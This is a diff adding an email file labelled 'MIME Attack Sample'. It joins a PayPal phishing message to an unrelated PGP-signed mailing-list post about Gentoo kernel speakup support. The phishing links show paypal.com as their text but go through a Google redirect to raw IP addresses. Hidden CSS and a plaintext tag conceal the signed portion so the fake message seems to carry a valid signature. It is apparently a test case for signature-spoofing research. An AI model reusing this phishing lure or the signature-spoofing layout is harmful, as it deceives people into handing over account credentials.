@@ -1,0 +1,88 @@
+From: blair1115h@emsiweb.com
+To: hjosey@aol.com
+Subject: MIME Attack Sample
+Content-Type: multipart/mixed; boundary="DELIMITER"
+--DELIMITER
+Content-Type: text/html
+Content-Type: text/html
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 482
+
+
+<HTML>
+<BODY>
+<P><FONT face="MS Sans Serif">As part of our security 
+measures, we regularly screen activity in the<BR>PayPal system. We recently 
+noticed the following issue on your account:</FONT></P>
+<P><FONT face="MS Sans Serif">We would like to ensure that your account was not 
+accessed by an<BR>unauthorized third party. Because protecting the security of 
+your <BR>account is our primary concern, we have limited access to sensitive 
+PayPal <BR>account features. We understand that this may be an inconvenience but 
+please<BR>understand that this temporary limitation is for your 
+protection.<BR>Case ID Number: PP-072-838-482 </FONT></P>
+<P><a target="_parent" 
+href="http://google.com/url?sa=p&pref=ig&pval=2&q=http://200.195.197.58/.cgi_bin/webscr=cmd=_home/"><FONT 
+face="MS Sans Serif">https://www.paypal.com/us/cgi-bin/webscr?cmd=complaint-view</FONT></A></P>
+<P><FONT face="MS Sans Serif"></FONT>&nbsp;</P>
+<P><FONT face="MS Sans Serif">For your protection, we have limited access to 
+your account until<BR>additional security measures can be completed. We 
+apologize for any<BR>inconvenience this may cause.</FONT></P>
+<P><BR><FONT face="MS Sans Serif">To review your account and some or all of the 
+information that PayPal <BR>usedto make its decision to limit your account 
+access, please visit the<BR>Resolution Center </FONT><a target="_parent" 
+href="http://google.com/url?sa=p&pref=ig&pval=2&q=http://59.60.0.6:3129/webscrr/index.php"><FONT 
+face="MS Sans Serif">https://www.paypal.com/</FONT></A><FONT 
+face="MS Sans Serif"> . If, after reviewing your account information, you 
+<BR>seekfurther clarification regarding your account access, please contact 
+<BR>PayPal by visiting the Help Center and clicking "Contact Us".We thank you 
+for <BR>your prompt attention to this matter. Please understand that this is a 
+<BR>security measure intended to help protect you and your account. We apologize 
+for <BR>any inconvenience.</FONT></P>
+<P><FONT face="MS Sans Serif">Sincerely,<BR>PayPal Account Review 
+Department</FONT></P>
+<P><FONT face="MS Sans Serif">PayPal Email ID PP645495</FONT></P>
+</BODY>
+</HTML>
+<style>fieldset, br{display: none;}</style>
+<div style="display: none;"><plaintext>
+--DELIMITER
+Content-Type: multipart/signed; boundary="BOUNDARY"; protocol="application/pgp-signature"
+--BOUNDARY
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+ SHA1
+
+On Mon, Jun 18, 2007 at 06:00:22AM EST, William Hubbs wrote:
+> -----BEGIN PGP SIGNED MESSAGE-----
+> Hash: SHA1
+> 
+> All,
+> 
+> because of this bug [1], gentoo linux will be dropping support for speakup in its official kernels starting at 2.6.22.
+> 
+> [1] http://bugs.gentoo.org/show_bug.cgi?id=177794
+
+I'd also like to point out that Ubuntu will be offering 2.6.22, and even 
+though speakup has been dropped, unless a solution for 2.6.22 is worked 
+out, speakup will also not work with the Next Ubuntu release.
+- -- 
+Luke Yelavich
+GPG key: 0xD06320CE 
+	 (http://www.themuso.com/themuso-gpg-key.txt)
+Email & MSN: themuso@themuso.com
+Jabber: themuso@jabber.org.au
+-BOUNDARY--
+Content-Type: application/pgp-signature; name="signature.asc"
+BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+
+iD8DBQFGdbUgjVefwtBjIM4RAmZlAKCdelQRK9rD52iwmSrUmZT4qpRPJwCeMuar
+GwJbGptIWhj6q4sbfghlXFw=
+=f44H
+-----END PGP SIGNATURE-----
+
+____
+--BOUNDARY--
+--DELIMITER--
